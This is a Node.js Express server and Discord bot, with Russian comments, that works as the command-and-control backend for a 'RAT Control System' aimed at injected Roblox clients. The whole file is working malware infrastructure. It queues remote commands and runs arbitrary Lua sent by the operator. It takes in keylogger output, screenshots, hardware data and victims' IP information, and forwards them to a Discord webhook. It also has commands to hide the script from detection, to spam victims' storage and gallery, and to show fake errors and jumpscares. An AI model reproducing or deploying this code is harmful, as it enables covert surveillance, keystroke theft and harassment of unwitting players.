[file content begin]
const express = require('express');
const fetch = require('node-fetch');
const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
const cors = require('cors');

// ========== КОНФИГУРАЦИЯ ==========
const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
const SERVER_URL = process.env.SERVER_URL || "https://ratserver-6wo3.onrender.com";
const WEBHOOK_URL = process.env.WEBHOOK_URL;
const PORT = process.env.PORT || 10000;

// Логирование конфигурации (без показа токенов)
console.log('🔧 Конфигурация сервера v3.1:');
console.log(`- PORT: ${PORT}`);
console.log(`- SERVER_URL: ${SERVER_URL}`);
console.log(`- DISCORD_TOKEN: ${DISCORD_TOKEN ? '✅ Установлен' : '❌ Отсутствует'}`);
console.log(`- WEBHOOK_URL: ${WEBHOOK_URL ? '✅ Установлен' : '❌ Отсутствует'}`);
console.log(`- Режим: ${DISCORD_TOKEN ? 'Бот + Вебхук' : 'Только Вебхук'}`);
console.log(`- Express.js: ✅ Используется`);

// ========== ХРАНИЛИЩЕ ДАННЫХ ==========
let commandQueue = [];
let lastScreenshot = null;
global.onlineUsers = new Map();

// ========== ИНИЦИАЛИЗАЦИЯ EXPRESS ==========
const app = express();
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ========== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ==========
function isValidUsername(str) {
    if (!str || typeof str !== 'string') return false;
    if (str.length < 3 || str.length > 20) return false;
    if (!/^[a-zA-Z0-9_]+$/.test(str)) return false;
    if (!isNaN(parseInt(str))) return false;
    if (str.startsWith('-')) return false;
    return true;
}

function parseCommandWithTarget(message) {
    const args = message.content.slice(1).split(' ');
    const command = args.shift().toLowerCase();
    
    if (args.length === 0) {
        return { command, args, target: null };
    }
    
    const noTargetCommands = ['users', 'status', 'help', 'test', 'print'];
    const textFirstCommands = ['message', 'fakeerror', 'execute', 'popup'];
    const textPossibleCommands = ['kick'];
    const mixedFirstArgCommands = ['cameralock', 'freeze', 'blur', 'playaudio', 'jumpscare', 'camerashake'];
    
    if (noTargetCommands.includes(command)) {
        return { command, args, target: null };
    }
    
    if (textFirstCommands.includes(command)) {
        return { command, args, target: null };
    }
    
    if (textPossibleCommands.includes(command)) {
        if (args.length > 1 && isValidUsername(args[0])) {
            const target = args.shift();
            return { command, args, target };
        }
        return { command, args, target: null };
    }
    
    if (mixedFirstArgCommands.includes(command)) {
        const firstArg = args[0].toLowerCase();
        const validTextValues = ['on', 'off', 'enable', 'disable', 'true', 'false'];
        
        if (validTextValues.includes(firstArg) || !isNaN(parseInt(firstArg))) {
            return { command, args, target: null };
        }
        
        if (isValidUsername(args[0])) {
            const target = args.shift();
            return { command, args, target };
        }
        
        return { command, args, target: null };
    }
    
    const firstArg = args[0];
    if (isValidUsername(firstArg)) {
        const target = args.shift();
        return { command, args, target };
    }
    
    return { command, args, target: null };
}

// ========== DISCORD БОТ ==========
let discordClient = null;

if (DISCORD_TOKEN) {
    discordClient = new Client({ 
        intents: [
            GatewayIntentBits.Guilds,
            GatewayIntentBits.GuildMessages,
            GatewayIntentBits.MessageContent,
            GatewayIntentBits.GuildMembers
        ] 
    });

    async function sendCommand(command, args = [], target = null) {
        try {
            const payload = {
                command: command,
                args: args
            };
            
            if (target) {
                payload.target = target;
            }
            
            const response = await fetch(`${SERVER_URL}/command`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            
            console.log(`📨 Команда ${command} отправлена для ${target || 'всех игроков'}`);
            return response.ok;
        } catch (error) {
            console.error(`❌ Ошибка отправки команды ${command}:`, error.message);
            return false;
        }
    }

    async function getOnlineUsers() {
        try {
            const response = await fetch(`${SERVER_URL}/users`);
            if (response.ok) {
                return await response.json();
            }
            return { users: [], count: 0 };
        } catch (error) {
            console.error('❌ Ошибка получения пользователей:', error.message);
            return { users: [], count: 0 };
        }
    }

    async function getServerStatus() {
        try {
            const response = await fetch(`${SERVER_URL}/status`);
            if (response.ok) {
                return await response.json();
            }
            return null;
        } catch (error) {
            console.error('❌ Ошибка получения статуса:', error.message);
            return null;
        }
    }

    function createEmbed(title, description, color, target = null) {
        const embed = new EmbedBuilder()
            .setTitle(title)
            .setColor(color);
        
        if (target) {
            embed.setDescription(`**🎯 Цель:** \`${target}\`\n${description}`);
        } else {
            embed.setDescription(description);
        }
        
        return embed;
    }

    discordClient.on('ready', () => {
        console.log(`🤖 Discord бот ${discordClient.user.tag} запущен!`);
        console.log(`🌐 Подключено к серверу: ${SERVER_URL}`);
        console.log(`🎯 Версия: 3.1 (27 команд + исправленный парсер)`);
        
        discordClient.user.setActivity('RAT Control Panel v3.1', { type: 'WATCHING' });
    });

    // ========== ВСЕ КОМАНДЫ ==========
    discordClient.on('messageCreate', async message => {
        if (message.author.bot) return;
        
        if (message.content.startsWith('/')) {
            const { command, args, target } = parseCommandWithTarget(message);
            
            const commandHandlers = {
                test: async () => {
                    const text = "Тестовая команда от Discord бота! ✅";
                    if (await sendCommand("popup", [text], target)) {
                        const embed = createEmbed('🧪 Тестовая команда', 'Сообщение отправлено', 0x00ff00, target);
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                print: async () => {
                    if (await sendCommand("print", [], target)) {
                        const embed = createEmbed('📡 Проверка связи', 'Команда проверки связи отправлена', 0x00ff00, target);
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                kick: async () => {
                    const reason = args.join(' ') || 'Нарушение правил';
                    if (await sendCommand("kick", [reason], target)) {
                        const embed = createEmbed('🦶 Кик', `**Причина:** ${reason}`, 0xe74c3c, target);
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                freeze: async () => {
                    let seconds = parseInt(args[0]) || 5;
                    seconds = Math.min(seconds, 60);
                    if (await sendCommand("freeze", [seconds], target)) {
                        const embed = createEmbed('❄️ Заморозка', `**Длительность:** \`${seconds}\` секунд`, 0x3498db, target);
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                void: async () => {
                    if (await sendCommand("void", [], target)) {
                        const embed = createEmbed('🌀 Телепорт в бездну', 'Игрок телепортирован в бездну', 0x2c3e50, target);
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                spin: async () => {
                    if (await sendCommand("spin", [], target)) {
                        const embed = createEmbed('🔄 Вращение', 'Игрок начинает вращаться', 0xf39c12, target);
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                fling: async () => {
                    if (await sendCommand("fling", [], target)) {
                        const embed = createEmbed('🚀 Подбрасывание', 'Игрок подброшен в воздух', 0xe67e22, target);
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                sit: async () => {
                    if (await sendCommand("sit", [], target)) {
                        const embed = createEmbed('🪑 Изменение позы', 'Игрок меняет позу (сидит/встает)', 0x27ae60, target);
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                dance: async () => {
                    if (await sendCommand("dance", [], target)) {
                        const embed = createEmbed('💃 Танец', 'Игрок начинает танцевать', 0xe91e63, target);
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                mute: async () => {
                    if (await sendCommand("mute", [], target)) {
                        const embed = createEmbed('🔇 Звуки отключены', 'Все звуки в игре выключены', 0x95a5a6, target);
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                unmute: async () => {
                    if (await sendCommand("unmute", [], target)) {
                        const embed = createEmbed('🔊 Звуки включены', 'Все звуки в игре включены', 0x2ecc71, target);
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                playaudio: async () => {
                    const audioId = args[0] || "184702873";
                    if (await sendCommand("playaudio", [audioId], target)) {
                        const embed = createEmbed('🔊 Воспроизведение аудио', `**ID аудио:** \`${audioId}\``, 0x9b59b6, target);
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                blur: async () => {
                    let seconds = parseInt(args[0]) || 5;
                    seconds = Math.min(seconds, 30);
                    if (await sendCommand("blur", [seconds], target)) {
                        const embed = createEmbed('🔵 Размытие экрана', `**Длительность:** \`${seconds}\` секунд`, 0x3498db, target);
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                chat: async () => {
                    if (await sendCommand("chat", [], target)) {
                        const embed = createEmbed('💬 Управление чатом', 'Чат активирован/деактивирован', 0x9b59b6, target);
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                message: async () => {
                    const text = args.join(' ');
                    if (!text) {
                        await message.reply('❌ Укажите текст сообщения');
                        return;
                    }
                    
                    if (text.length > 100) {
                        await message.reply('❌ Сообщение слишком длинное (макс. 100 символов)');
                        return;
                    }
                    
                    if (await sendCommand("popup", [text], target)) {
                        const embed = createEmbed('📩 Сообщение отправлено', `**Текст:** \`\`\`${text}\`\`\``, 0x3498db, target);
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                jumpscare: async () => {
                    let scareType = parseInt(args[0]) || 1;
                    const scareNames = { 1: "Джефф Килер 👹", 2: "Соник.exe 💀" };
                    const name = scareNames[scareType] || scareNames[1];
                    
                    if (await sendCommand("jumpscare", [scareType], target)) {
                        const embed = createEmbed(`👻 Скример ${name}`, '**Тайминг:**\n1. 2 сек - звук предупреждения\n2. 3 сек - пауза\n3. ⚡ СКРИМЕР!\n**Длительность:** ~10 секунд', 0xff0000, target);
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                cameralock: async () => {
                    const action = args[0] || "toggle";
                    const actionText = action === "on" ? "Включена" : action === "off" ? "Выключена" : "Переключена";
                    
                    if (await sendCommand("cameralock", [action], target)) {
                        const embed = createEmbed('🎥 Блокировка камеры', `**Действие:** ${actionText}\nКамера игрока будет заблокирована в текущей позиции`, 0x3498db, target);
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                camerashake: async () => {
                    let duration = parseInt(args[0]) || 5;
                    let intensity = parseInt(args[1]) || 2;
                    
                    duration = Math.min(duration, 30);
                    intensity = Math.min(intensity, 10);
                    
                    if (await sendCommand("camerashake", [duration, intensity], target)) {
                        const embed = createEmbed('📷 Тряска камеры', `**Длительность:** \`${duration}\` секунд\n**Интенсивность:** \`${intensity}\`\nКамера игрока будет трястись с указанной силой`, 0xe67e22, target);
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                execute: async () => {
                    const code = args.join(' ');
                    if (!code) {
                        await message.reply('❌ Укажите код для выполнения');
                        return;
                    }
                    
                    if (code.length > 500) {
                        await message.reply('❌ Код слишком длинный (макс. 500 символов)');
                        return;
                    }
                    
                    if (await sendCommand("execute", [code], target)) {
                        const embed = createEmbed('🔧 Код отправлен', `\`\`\`lua\n${code.substring(0, 100)}${code.length > 100 ? '...' : ''}\n\`\`\``, 0xf39c12, target);
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                fakeerror: async () => {
                    const errorText = args.join(' ') || 'Системная ошибка';
                    const displayText = errorText.length > 80 ? errorText.substring(0, 77) + '...' : errorText;
                    
                    if (await sendCommand("fakeerror", [displayText], target)) {
                        const embed = createEmbed('⚠ Фейковая ошибка', `**Сообщение:** \`${displayText}\``, 0xe74c3c, target);
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                keylog: async () => {
                    if (await sendCommand("keylog", [], target)) {
                        const embed = createEmbed('⌨️ Кейлоггер', 'Кейлоггер активирован. Логи будут отправляться каждые 5 минут.', 0xe74c3c, target);
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                stopkeylog: async () => {
                    if (await sendCommand("stopkeylog", [], target)) {
                        const embed = createEmbed('🛑 Кейлоггер', 'Кейлоггер деактивирован. Последние логи отправлены.', 0x2ecc71, target);
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                hardware: async () => {
                    if (await sendCommand("hardware", [], target)) {
                        const embed = createEmbed('🖥️ Оборудование', 'Данные об оборудовании запрошены', 0x00ff00, target);
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                hide: async () => {
                    if (await sendCommand("hide", [], target)) {
                        const embed = createEmbed('👻 Скрытие скрипта', 'Скрипт успешно скрыт от систем обнаружения', 0x00ff00, target);
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                memory: async () => {
                    let fileCount = parseInt(args[0]) || 100;
                    fileCount = Math.min(fileCount, 1000);
                    
                    if (await sendCommand("memory_spam", [fileCount], target)) {
                        const embed = createEmbed('💾 Memory Spam', `**Количество файлов:** \`${fileCount}\``, 0xff6b6b, target);
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                gallery: async () => {
                    let imageCount = parseInt(args[0]) || 10;
                    imageCount = Math.min(imageCount, 50);
                    
                    if (await sendCommand("gallery_spam", [imageCount], target)) {
                        const embed = createEmbed('🖼️ Gallery Spam', `**Количество файлов:** \`${imageCount}\`\n**Источник:** GitHub`, 0x74b9ff, target);
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                screenshot: async () => {
                    if (await sendCommand("screenshot", [], target)) {
                        const embed = createEmbed('🖥️ Скриншот', 'Скриншот запрошен. Результат будет через 5 секунд.', 0x3498db, target);
                        await message.reply({ embeds: [embed] });
                        
                        setTimeout(async () => {
                            try {
                                const response = await fetch(`${SERVER_URL}/screenshot`);
                                if (response.ok) {
                                    const data = await response.json();
                                    if (data.image) {
                                        await message.reply('📸 Скриншот получен (база64)');
                                    }
                                }
                            } catch (e) {
                                console.error('Ошибка получения скриншота:', e);
                            }
                        }, 5000);
                    }
                },
                
                users: async () => {
                    const data = await getOnlineUsers();
                    
                    if (data.count === 0) {
                        const embed = new EmbedBuilder()
                            .setTitle('👥 Онлайн пользователи')
                            .setDescription('❌ Нет активных пользователей')
                            .setColor(0xff0000);
                        await message.reply({ embeds: [embed] });
                        return;
                    }
                    
                    const embed = new EmbedBuilder()
                        .setTitle('👥 Онлайн пользователи')
                        .setDescription(`**Всего пользователей:** ${data.count}`)
                        .setColor(0x00ff00)
                        .setTimestamp();
                    
                    const games = {};
                    data.users.forEach(user => {
                        const game = user.place || 'Unknown';
                        if (!games[game]) games[game] = [];
                        games[game].push(user);
                    });
                    
                    for (const [game, users] of Object.entries(games)) {
                        const userList = users.slice(0, 5).map(u => 
                            `\`${u.player}\` (${u.executor || 'Unknown'})`
                        ).join('\n');
                        
                        embed.addFields({
                            name: `🎮 ${game} (${users.length})`,
                            value: userList + (users.length > 5 ? `\n... и еще ${users.length - 5}` : ''),
                            inline: false
                        });
                    }
                    
                    await message.reply({ embeds: [embed] });
                },
                
                status: async () => {
                    const data = await getServerStatus();
                    
                    if (data) {
                        const embed = new EmbedBuilder()
                            .setTitle('📊 Статус системы')
                            .setDescription('Текущее состояние RAT Control System')
                            .setColor(0x7289da)
                            .addFields(
                                { name: '🤖 Бот', value: '🟢 Активен', inline: true },
                                { name: '🌐 Сервер', value: '🟢 Активен', inline: true },
                                { name: '📨 Команды в очереди', value: `\`${data.pending_commands || 0}\``, inline: true },
                                { name: '👥 Онлайн пользователей', value: `\`${data.online_users || 0}\``, inline: true },
                                { name: '🛠️ Техническая информация', value: `• Версия: \`3.1.0\`\n• Сервер: \`${SERVER_URL}\`\n• Команд: \`27\`\n• Обновление: \`15 секунд\``, inline: false }
                            )
                            .setTimestamp();
                        
                        await message.reply({ embeds: [embed] });
                    } else {
                        await message.reply('❌ Ошибка получения статуса');
                    }
                },
                
                help: async () => {
                    const helpEmbed = new EmbedBuilder()
                        .setTitle('🤖 RAT Control Panel v3.1')
                        .setDescription('Полный список всех команд с поддержкой таргетинга')
                        .setColor(0x7289da)
                        .addFields(
                            { 
                                name: '🎯 Формат команд:', 
                                value: '• `/команда` - для всех игроков\n• `/команда ник` - для конкретного игрока\n• `/команда ник аргументы` - с параметрами\n\n**Примеры:**\n`/fakeerror текст` - для всех\n`/fakeerror PlayerName текст` - для игрока\n`/cameralock on` - для всех\n`/cameralock PlayerName off` - для игрока', 
                                inline: false 
                            },
                            { 
                                name: '📷 Камерные команды', 
                                value: '`/cameralock [ник] <on/off>` - блокировка камеры\n`/camerashake [ник] <секунды> <интенсивность>` - тряска камеры', 
                                inline: false 
                            },
                            { 
                                name: '👤 Управление игроком', 
                                value: '`/kick [ник] <причина>`\n`/freeze [ник] <секунды>`\n`/void [ник]`\n`/spin [ник]`\n`/fling [ник]`\n`/sit [ник]`\n`/dance [ник]`', 
                                inline: false 
                            },
                            { 
                                name: '🔊 Аудио/Видео', 
                                value: '`/mute [ник]`\n`/unmute [ник]`\n`/playaudio [ник] <id>`\n`/blur [ник] <секунды>`\n`/screenshot [ник]`', 
                                inline: false 
                            },
                            { 
                                name: '💬 Чат', 
                                value: '`/chat [ник]`\n`/message [ник] <текст>`', 
                                inline: false 
                            },
                            { 
                                name: '👻 Скримеры', 
                                value: '`/jumpscare [ник] <тип>`\n1-Джефф Килер, 2-Соник.exe', 
                                inline: false 
                            },
                            { 
                                name: '⚙️ Системные', 
                                value: '`/execute [ник] <код>`\n`/fakeerror [ник] <текст>`\n`/keylog [ник]`\n`/stopkeylog [ник]`\n`/hardware [ник]`\n`/hide [ник]`', 
                                inline: false 
                            },
                            { 
                                name: '💥 Spam', 
                                value: '`/memory [ник] <кол-во>`\n`/gallery [ник] <кол-во>`', 
                                inline: false 
                            },
                            { 
                                name: '👥 Информация', 
                                value: '`/users` - онлайн игроки\n`/status` - статус системы\n`/test` - тест\n`/print` - проверка связи', 
                                inline: false 
                            }
                        )
                        .setFooter({ text: `Всего команд: 27 | Сервер: ${SERVER_URL} | Версия: 3.1.0` });
                    
                    await message.reply({ embeds: [helpEmbed] });
                }
            };
            
            if (commandHandlers[command]) {
                try {
                    await commandHandlers[command]();
                } catch (error) {
                    console.error(`❌ Ошибка выполнения команды ${command}:`, error);
                    await message.reply(`❌ Ошибка выполнения команды: ${error.message}`);
                }
            } else if (command) {
                await message.reply(`❌ Неизвестная команда \`${command}\`. Используйте \`/help\` для списка команд.`);
            }
        }
    });

    discordClient.login(DISCORD_TOKEN).then(() => {
        console.log('✅ Discord бот успешно авторизован');
    }).catch(error => {
        console.error('❌ Ошибка авторизации Discord бота:', error.message);
        console.error('💡 Проверьте токен в Environment Variables на Render');
    });
} else {
    console.log('⚠️ DISCORD_TOKEN не установлен. Discord бот не будет запущен.');
}

// ========== СЕРВЕРНАЯ ЛОГИКА ==========
function cleanupInactiveUsers() {
    const now = Date.now();
    for (let [key, user] of global.onlineUsers.entries()) {
        if (now - user.lastSeen > 60 * 1000) {
            global.onlineUsers.delete(key);
        }
    }
}

setInterval(cleanupInactiveUsers, 30 * 1000);

async function sendDiscordMessage(title, description, color = 0x3498db, fields = []) {
    if (!WEBHOOK_URL) {
        console.log('⚠️ WEBHOOK_URL не установлен. Пропускаем отправку сообщения.');
        return;
    }
    
    try {
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                embeds: [{
                    title: title,
                    description: description,
                    color: color,
                    fields: fields,
                    timestamp: new Date().toISOString(),
                    footer: { text: "RAT Control System v3.1" }
                }]
            })
        });
    } catch (error) {
        console.error('❌ Discord webhook error:', error.message);
    }
}

// ========== МАРШРУТЫ EXPRESS ==========

// Получение команд для клиента
app.get('/data', (req, res) => {
    try {
        const player = req.query.player;
        
        const commandsForPlayer = [];
        const remainingCommands = [];
        
        for (const cmd of commandQueue) {
            if (cmd.target === null || cmd.target === player || cmd.target === 'all') {
                commandsForPlayer.push(cmd);
            } else {
                remainingCommands.push(cmd);
            }
        }
        
        commandQueue = remainingCommands;
        
        if (commandsForPlayer.length > 0) {
            const cmd = commandsForPlayer[0];
            res.json({
                command: cmd.command,
                args: cmd.args
            });
        } else {
            res.json({
                command: "",
                args: []
            });
        }
    } catch (e) {
        res.status(400).json({ error: e.message });
    }
});

// Отправка команды от бота
app.post('/command', async (req, res) => {
    try {
        const { command, args, target } = req.body;
        
        commandQueue.push({
            command: command,
            args: args || [],
            target: target || null,
            timestamp: Date.now()
        });
        
        // ⚠️ ИСПРАВЛЕНИЕ: Безопасная обработка inject_notify с 5 аргументами
        if (command === "inject_notify") {
            // Получаем все 5 аргументов с дефолтными значениями
            const playerName = args[0] || "Unknown";
            const gameName = args[1] || "Unknown";
            const ipInfo = args[2] || "N/A";
            const executor = args[3] || "Unknown";
            const device = args[4] || "Unknown";
            
            let description = `**Игрок:** ${playerName}\n`;
            description += `**Игра:** ${gameName}\n`;
            description += `**Инжектор:** ${executor}\n`;
            description += `**Устройство:** ${device}\n\n`;
            description += `**IP информация**\n${ipInfo}`;
            
            await sendDiscordMessage("🔌 Новый инжект!", description, 0x00ff00);
        }
        
        if (command === "cameralock") {
            const action = args[0] || "toggle";
            const targetText = target || "всех игроков";
            await sendDiscordMessage("🎥 Блокировка камеры", `**Цель:** ${targetText}\n**Действие:** ${action}`, 0x3498db);
        }
        
        if (command === "camerashake") {
            const duration = args[0] || 5;
            const intensity = args[1] || 2;
            const targetText = target || "всех игроков";
            await sendDiscordMessage("📷 Тряска камеры", `**Цель:** ${targetText}\n**Длительность:** ${duration} сек\n**Интенсивность:** ${intensity}`, 0xe67e22);
        }
        
        if (command === "spam_completed") {
            await sendDiscordMessage("📁 Спам завершен", `**Тип:** ${args[0]}\n**Результат:** ${args[1]}`, 0xf39c12);
        }
        
        if (command === "user_chat") {
            await sendDiscordMessage("💬 Чат игрока", `**Игрок:** ${args[0]}\n**Сообщение:** ${args[1]}`, 0x3498db);
        }
        
        res.json({ status: "OK" });
    } catch (e) {
        res.status(400).json({ error: e.message });
    }
});

// Получение списка онлайн пользователей
app.get('/users', (req, res) => {
    cleanupInactiveUsers();
    const users = Array.from(global.onlineUsers.values());
    res.json({
        users: users,
        count: users.length
    });
});

// Обновление информации о пользователе
app.post('/users', (req, res) => {
    try {
        const { player, place, executor, device } = req.body;
        global.onlineUsers.set(player, {
            player: player,
            place: place,
            executor: executor,
            device: device || "Unknown",
            lastSeen: Date.now()
        });
        res.json({ status: "OK" });
    } catch (e) {
        res.status(400).json({ error: e.message });
    }
});

// Скриншоты
app.post('/screenshot', (req, res) => {
    try {
        const { image } = req.body;
        lastScreenshot = image;
        res.json({ status: "OK" });
    } catch (e) {
        res.status(400).json({ error: e.message });
    }
});

app.get('/screenshot', (req, res) => {
    res.json({ 
        image: lastScreenshot || null 
    });
});

// Кейлоггер
app.post('/keylog', async (req, res) => {
    try {
        const { logs } = req.body;
        await sendDiscordMessage("⌨️ Кейлоггер", `\`\`\`${logs.slice(0, 1900)}\`\`\``, 0xe74c3c);
        res.json({ status: "OK" });
    } catch (e) {
        res.status(400).json({ error: e.message });
    }
});

// Получение информации о железе
app.post('/hardware', async (req, res) => {
    try {
        const { player, data } = req.body;
        await sendDiscordMessage(
            "💻 Информация о системе",
            `**Игрок:** ${player}\n**Игра:** ${data.game}\n**FPS:** ${data.fps}\n**Пинг:** ${data.ping}\n**Экзекутор:** ${data.executor}\n**Устройство:** ${data.device_type}\n**IP Инфо:** ${data.ip_info}`,
            0x9b59b6,
            [
                {
                    name: "Системная информация",
                    value: `Touch: ${data.system.touch_enabled}\nMouse: ${data.system.mouse_enabled}\nKeyboard: ${data.system.keyboard_enabled}\nScreen: ${data.system.screen_size.X}x${data.system.screen_size.Y}`,
                    inline: true
                }
            ]
        );
        res.json({ status: "OK" });
    } catch (e) {
        res.status(400).json({ error: e.message });
    }
});

// Статус сервера
app.get('/status', (req, res) => {
    cleanupInactiveUsers();
    res.json({
        status: "online",
        version: "3.1.0",
        online_users: global.onlineUsers.size,
        pending_commands: commandQueue.length,
        discord_bot: discordClient && discordClient.user ? {
            username: discordClient.user.tag,
            status: "online",
            commands_count: 27,
            targeted_commands: true
        } : { status: "disabled" }
    });
});

// Информация о системе
app.get('/system_info', (req, res) => {
    res.json({
        name: "RAT Control System",
        version: "3.1.0",
        description: "Продвинутая система удаленного управления Roblox клиентами",
        server: SERVER_URL,
        features: [
            "Управление игроком (кик, заморозка, телепорт)",
            "Скример система (Джефф Килер, Соник.exe)",
            "Камерные команды (блокировка, тряска)",
            "Чат система с сообщениями",
            "Мониторинг устройств",
            "Кейлоггер",
            "Spam инструменты",
            "Таргетированные команды (исправленный парсер)"
        ],
        total_commands: 27,
        discord_bot: discordClient && discordClient.user ? {
            username: discordClient.user.tag,
            status: "online",
            commands_count: 27,
            targeted_commands: true
        } : { status: "disabled_no_token" }
    });
});

// Корневой путь
app.get('/', (req, res) => {
    res.json({
        message: "RAT Control System v3.1",
        endpoints: [
            "GET  /data?player=NAME - Получение команд",
            "GET  /users - Онлайн пользователи",
            "GET  /status - Статус системы",
            "GET  /system_info - Информация о проекте",
            "POST /command - Отправка команд",
            "POST /users - Обновление информации о пользователе",
            "POST /screenshot - Загрузка скриншотов",
            "POST /keylog - Отправка логов кейлоггера",
            "POST /hardware - Информация о системе"
        ],
        documentation: "Используйте /help в Discord для управления",
        new_features: "✅ Исправленный парсер команд | ✅ CameraLock | ✅ CameraShake | ✅ Express.js"
    });
});

// Запуск сервера
app.listen(PORT, () => {
    console.log(`🚀 Сервер Express запущен на порту ${PORT}`);
    console.log(`🌐 URL: ${SERVER_URL}`);
    console.log('📡 Эндпоинты:');
    console.log('• GET  /data?player=NAME - Получение команд для клиента');
    console.log('• POST /command - Отправка команд от бота');
    console.log('• GET  /users - Список онлайн пользователей');
    console.log('• GET  /status - Статус сервера');
    console.log('• GET  /system_info - Информация о системе');
    console.log('');
    console.log('🆕 НОВЫЕ ФУНКЦИИ v3.1:');
    console.log('• ✅ Исправленный парсер команд (не путает текст с никами)');
    console.log('• ✅ CameraLock - блокировка камеры игрока');
    console.log('• ✅ CameraShake - тряска камеры с настройкой интенсивности');
    console.log('• ✅ Express.js - улучшенная архитектура сервера');
    console.log('');
    
    if (DISCORD_TOKEN) {
        console.log('💬 Discord команды готовы:');
        console.log('• /help - Список всех команд (27 команд)');
        console.log('• /users - Онлайн пользователи');
        console.log('• /cameralock [ник] <on/off> - Блокировка камеры');
        console.log('• /camerashake [ник] <секунды> <интенсивность> - Тряска');
        console.log('• /jumpscare [ник] <тип> - Скримеры');
        console.log('🎯 Формат: /команда [ник] [аргументы]');
    } else {
        console.log('⚠️ Discord команды недоступны - установи DISCORD_TOKEN в Environment');
    }
});

// Обработка ошибок
process.on('uncaughtException', (err) => {
    console.error('❌ Необработанное исключение:', err);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('❌ Необработанный промис:', reason);
});
[file content end]
